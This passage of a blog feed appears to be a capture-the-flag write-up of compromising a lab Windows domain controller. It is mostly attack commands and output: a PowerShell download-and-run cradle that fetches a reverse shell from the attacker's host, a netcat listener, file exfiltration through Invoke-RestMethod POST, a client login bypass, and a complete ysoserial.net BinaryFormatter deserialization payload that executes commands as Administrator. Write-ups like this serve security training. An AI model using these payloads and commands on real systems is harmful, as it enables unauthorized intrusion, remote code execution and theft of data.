+<p>Now I am able to execute commands as <em>MiscSvc</em>, so I&rsquo;ll get another reverse shell as that user using the same technique, but I need to change the port number in the last line of <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"><em>Invoke-PowerShellTcp.ps1</em></a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.59 -Port <span style="color:#ae81ff">8990</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-Command -ComputerName dc1.scrm.local -Credential $cred <span style="color:#f92672">{</span>IEX <span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://10.10.16.59:8000/Invoke-PowerShellTcp.ps1&#34;</span><span style="color:#f92672">)}</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8990</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8990</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.59<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.168<span style="color:#f92672">]</span> <span style="color:#ae81ff">49552</span>
+</span></span><span style="display:flex;"><span>Windows PowerShell running as user miscsvc on DC1
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\D</span>ocuments&gt;whoami
+</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\m</span>iscsvc
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\D</span>ocuments&gt; cat ..<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt       
+</span></span><span style="display:flex;"><span>39d**************************399</span></span></code></pre></div></p>
+<ul>
+<li>Notice here I used <em>IEX</em> expression directly without <em>powershell</em> command before it, otherwise it will throw an error because <em>Invoke-Command</em> already uses powershell as interpreter not cmd.</li>
+</ul>
+<p>After enumerating a little bit, I was looking for the custom application listening on port <em>4411</em>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares&gt; netstat -ano | Select-String LISTENING
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    TCP    0.0.0.0:4411           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">3116</span>
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares&gt; Get-Process -Id <span style="color:#ae81ff">3116</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Handles  NPM<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>    PM<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>      WS<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>     CPU<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>     Id  SI ProcessName                                                  
+</span></span><span style="display:flex;"><span>-------  ------    -----      -----     ------     --  -- -----------                                                  
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">439</span>      <span style="color:#ae81ff">15</span>    <span style="color:#ae81ff">17984</span>      <span style="color:#ae81ff">19940</span>              <span style="color:#ae81ff">3116</span>   <span style="color:#ae81ff">0</span> ScrambleServer                                               </span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files&gt; dir
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    d-----       03/11/2021     20:49                ScrambleCorp
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files&gt; cd ScrambleCorp
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\S</span>crambleCorp&gt; dir
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\S</span>crambleCorp&gt; dir : Access to the path <span style="color:#e6db74">&#39;C:\Program Files\ScrambleCorp&#39;</span> is denied.</span></span></code></pre></div></p>
+<p>So it looks like we cannot see the server&rsquo;s directory, thus we can&rsquo;t reverse engineer this server, and since <em>Miscsvc</em> is the only user, I can guess that the <em>Administrator</em> is the one responsible of it, which might be our way to escalate. I then found the <em>client executable</em> in one of the shares that <em>Miscsvc</em> had read permission to.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                  
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                  
+</span></span><span style="display:flex;"><span>-a----       05/11/2021     20:52          <span style="color:#ae81ff">86528</span> ScrambleClient.exe                                                    
+</span></span><span style="display:flex;"><span>-a----       05/11/2021     20:52          <span style="color:#ae81ff">19456</span> ScrambleLib.dll                                                       </span></span></code></pre></div></p>
+<p>So I&rsquo;ll copy these two files to my kali machine. I&rsquo;ll use powershell <em>Invoke-RestMethod</em> which will allow me to send <em>Post</em> requests including the file as parameter, then will catch this request from my kali machine using <em>netcat</em>.
+However, I need to copy these files to a directory that I own to avoid access denied error.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ScrambleClient.exe C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; cp ScrambleLib.dll C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; cd C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments&gt; Invoke-RestMethod -Uri <span style="color:#e6db74">&#34;http://10.10.16.59:9001/&#34;</span> -Method Post -UseDefaultCredentials -Infile <span style="color:#e6db74">&#34;ScrambleClient.exe&#34;</span></span></span></code></pre></div>
+On kali I&rsquo;ll catch this using
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">9001</span> | awk <span style="color:#e6db74">&#39;NR &gt; 7 { print }&#39;</span> &gt; ScrambleClient.exe</span></span></code></pre></div></p>
+<ul>
+<li>I used awk here to strip the first few lines of <em>HTTP Request</em> that include <em>Request Line</em> and <em>Request Headers</em> because I only need the content of the files.</li>
+<li>Also, I need to press <em>ENTER</em> key in my netcat listener in order to terminate the connection from <em>Invoke-RestMethod</em>.</li>
+</ul>
+<p>From this point, I&rsquo;ll spawn <a href="https://github.com/mandiant/commando-vm"><em>Commando VM</em></a> (windows vm for penetration testing) in order to better debug the application using <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a>.</p>
+<p><img src="application-image.png" alt="Application Image"></p>
+<p>Looks like this application requires some credentials (the old ones did not work)</p>
+<p>While inspecting it using <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a> I found an interesting <em>login</em> check function</p>
+<p><img src="dnspy-finding-login-function.png" alt="Dnspy Finding Login Function"></p>
+<p>Double clicking this function will show us how it handles the checking</p>
+<p><img src="bypassing-login-custom-application.png" alt="Bypassing Login in Custom Application"></p>
+<p>It appears that anyone with the name <em>scrmdev</em> can login to the application without even supplying a password!</p>
+<p><img src="orders-custom-app.png" alt="Orders Custom App"></p>
+<p>Scrolling down a little bit in <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a>, I came accross an upload function that uploads some data to the server, but what&rsquo;s interesting about it is that it uses serialization.</p>
+<p><img src="upload-function-using-serialization.png" alt="Finding Interesting Uploads Function"></p>
+<p>Digging deeper, I found that it uses <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>BinaryFormatter</em></a> object which is vulnerable to <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>Desirialization Attack</em></a></p>
+<p><img src="use-of-binaryformatter.png" alt="Finding the use of BinaryFormatter"></p>
+<p>Since this is the client application, I can assume that the server also desirialzes this object using <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>BinaryFormatter</em></a>, thus is prone to <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>Desirialization Attack</em></a>.</p>
+<p>I found these blogs to be useful to understand how to exploit this vulnerabilty:</p>
+<ul>
+<li><a href="https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7">https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7</a></li>
+<li><a href="https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/">https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/</a></li>
+</ul>
+<p>I&rsquo;ll use <a href="https://github.com/pwntester/ysoserial.net"><em>ysoserial.net</em></a> to generate the payload
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; .<span style="color:#ae81ff">\y</span>soserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c <span style="color:#e6db74">&#39;cmd.exe /C type C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\Miscsvc\PWNED.txt&#39;</span> -o base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFcvYyBjbWQuZXhlIC9DIHR5cGUgQzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0ID4gQzpcVXNlcnNcTWlzY3N2Y1xQV05FRC50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw<span style="color:#f92672">==</span></span></span></code></pre></div></p>
+<p>Now let&rsquo;s try to send this encoded payload to see if we get anything back.</p>
+<p>I&rsquo;ll use <em>netcat</em> to connect to the server, however I need to know how to send data for the server to accept it.</p>
+<p>Again using <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a></p>
+<p><img src="finding-request-function.png" alt="Finding Request Method"></p>
+<p>This function appears to be taking two parameters <em>RequestType.UploadOrder</em> and the <em>Base64 Encoded Data</em>
+Digging deeper</p>
+<p><img src="finding-value-of-parameters.png" alt="Finding Value of Parameters"></p>
+<p><img src="understanding-the-request-method.png" alt="Understanding the request method"></p>
+<p>I can see that the request is done under this form: <em>UPLOAD_ORDER;[Base64 Encoded Data]</em></p>
+<p>Now I can connect using netcat and test if the payload will work
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc scrm.local <span style="color:#ae81ff">4411</span>
+</span></span><span style="display:flex;"><span>SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style="display:flex;"><span>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFcvYyBjbWQuZXhlIC9DIHR5cGUgQzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0ID4gQzpcVXNlcnNcTWlzY3N2Y1xQV05FRC50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw<span style="color:#f92672">==</span></span></span></code></pre></div>
+From my previous shell:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc&gt; cat PWNED.txt
+</span></span><span style="display:flex;"><span>296**************************30a</span></span></code></pre></div></p>
+<p>We can now execute commands as <em>Administrator</em></p>
+<p>If you&rsquo;re following along, you might have noticed that the other way to get Administrator directly, and avoid the use of <em>xp_cmdshell</em>, is by simply requesting a <em>TGT</em> for user <em>Miscsvc</em> after getting his credentials and then use the ticket with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py"><em>impacket-smbclient.py</em></a> (-k option like before) to read the shares and get <em>ScrambledClient.exe</em> then exploit the server.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
